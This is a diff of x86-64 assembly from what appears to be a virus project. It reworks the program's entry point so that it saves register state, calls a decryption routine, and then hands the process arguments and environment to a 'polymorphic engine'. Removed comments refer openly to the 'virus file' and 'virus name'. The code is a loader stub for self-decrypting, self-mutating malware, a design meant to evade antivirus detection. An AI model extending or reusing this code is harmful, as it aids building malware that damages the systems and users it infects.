@@ -13,59 +13,27 @@ section .text
 align 16
 _start:             ; Global entry point
 
-
-	;; this is undone, it gets the name of the virus file, for now ill hardcode the virus name in c program
-    ; mov rax, 1           
-    ; mov rdi, 1         
-    ; mov rsi, [rsp+8]
-    ; mov rdx, 5          
-    ; syscall
-
-	; ; save current state on stack
-	; push rsp
-	; push rdi
-	; push rsi
-    ; call decrypt
-
-	; ; reload the initial program, state
-	; pop rsi
-	; pop rdi
-	; pop rsp
-
-    ; mov rax, 1           
-    ; mov rdi, 1         
-    ; mov rsi, [rsp+8]
-    ; mov rdx, 5          
-    ; syscall
-
-	; ; save current state on stack
-	; push rsp
-	; push rdi
-	; push rsi
+	; save initial program state
 	mov rbx, rsp 
 	mov r14, rdi
 	mov r15, rsi
 
 	call decrypt
 
+	; reload the initial program, state
 	mov rsp, rbx 
 	mov rdi, r14
 	mov rsi, r15
 
-	mov rdi, decrypt
-	mov rsi, main
-	mov rax, decrypt.decryption_function
+	; call the polymorphicengine
+	xor rbp, rbp
+	pop rdi
+	mov rsi, rsp
+	lea rdx, [rsp+rdi+8*8]
+	push rdi
 	call polymorphicengine
 
 
-	; ; call polymorph engine
-	; xor rbp, rbp
-	; pop rdi
-	; mov rsi, rsp
-	; lea rdx, [rsp+rdi+8*8]
-	; push rdi
-	; call polymorphicengine
-	
 	; reload the initial program, state
 	mov rsp, rbx 
 	mov rdi, r14
